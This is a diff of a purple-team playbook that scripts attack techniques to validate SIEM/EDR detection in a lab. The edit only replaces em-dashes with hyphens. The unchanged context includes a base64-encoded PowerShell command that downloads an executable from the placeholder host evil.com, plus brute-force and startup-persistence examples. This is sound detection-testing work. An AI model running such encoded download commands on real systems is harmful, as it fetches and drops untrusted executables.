@@ -8,11 +8,11 @@ Integrate **Python**, **PowerShell**, and **Batch** scripts for realistic, multi
 
 ## ⚙️ Function
 
-A tight, four-step scripted loop (pick a TTP → script the attack in Python/PowerShell/Batch → run it in an isolated lab → check SIEM/EDR for the resulting logs and alerts). This is the **script-centric variant** of the purple team playbooks — where `PurpleTeam_Simple.md` and `PurpleTeam_Detailed.md` describe the exercise process and tooling ecosystem, this file is specifically about writing and running the actual attack scripts that drive detection validation, organized by scripting language/platform.
+A tight, four-step scripted loop (pick a TTP → script the attack in Python/PowerShell/Batch → run it in an isolated lab → check SIEM/EDR for the resulting logs and alerts). This is the **script-centric variant** of the purple team playbooks - where `PurpleTeam_Simple.md` and `PurpleTeam_Detailed.md` describe the exercise process and tooling ecosystem, this file is specifically about writing and running the actual attack scripts that drive detection validation, organized by scripting language/platform.
 
 ## 🏆 Goal
 
-Make it fast to go from "we want to validate detection for TTP X" to an actual runnable script and a confirmed SIEM/EDR alert (or confirmed detection gap) — minimizing the time between choosing a technique and getting a real answer about your detection coverage.
+Make it fast to go from "we want to validate detection for TTP X" to an actual runnable script and a confirmed SIEM/EDR alert (or confirmed detection gap) - minimizing the time between choosing a technique and getting a real answer about your detection coverage.
 
 ## 📋 When to Use
 
@@ -54,7 +54,7 @@ Below are practical examples for each script type.
 
 ---
 
-### 🧩 Example 1 — Brute Force
+### 🧩 Example 1 - Brute Force
 
 | Item | Value |
 |------|-------|
@@ -114,7 +114,7 @@ for %%P in (%PASSWORDS%) do (
 
 ---
 
-### 🧩 Example 2 — Suspicious PowerShell
+### 🧩 Example 2 - Suspicious PowerShell
 
 | Item | Value |
 |------|-------|
@@ -146,11 +146,11 @@ REM Spawn PowerShell with encoded download command
 powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AYgBhAGQALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAHQAZQBtAHAAXABiAGEAZAAuAGUAeABl
 ```
 
-*(This string is the UTF-16 base64 version of `Invoke-WebRequest ...` above — can regenerate as needed.)*
+*(This string is the UTF-16 base64 version of `Invoke-WebRequest ...` above - can regenerate as needed.)*
 
 ---
 
-### 🧩 Example 3 — Persistence via Startup (Batch)
+### 🧩 Example 3 - Persistence via Startup (Batch)
 
 | Item | Value |
 |------|-------|
@@ -180,7 +180,7 @@ Set-Content $Path "Start-Process notepad.exe"
 
 ---
 
-### 🧩 Example 4 — Python to Trigger SIEM Alert
+### 🧩 Example 4 - Python to Trigger SIEM Alert
 
 ```python
 import socket
